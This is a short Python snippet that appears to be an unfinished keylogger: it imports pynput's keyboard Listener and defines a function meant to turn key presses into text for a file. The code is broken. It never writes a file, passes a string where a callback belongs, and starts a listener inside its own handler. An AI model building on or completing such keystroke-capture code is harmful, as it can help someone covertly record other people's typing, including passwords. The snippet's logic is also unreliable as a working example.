from pynput.keyboard import Listener,Key



def from_keyboard_to_file(key):

    try:
        key = key.char
    except AttributeError:
        if key == Key.space:
          key = ' '
        if key == Key.enter:
            key = '\n'



    key_data = str(key)
    key_data = key_data.replace("'", " ")

    

    with Listener (on_press = key_data) as l:
         l.join()

    return l

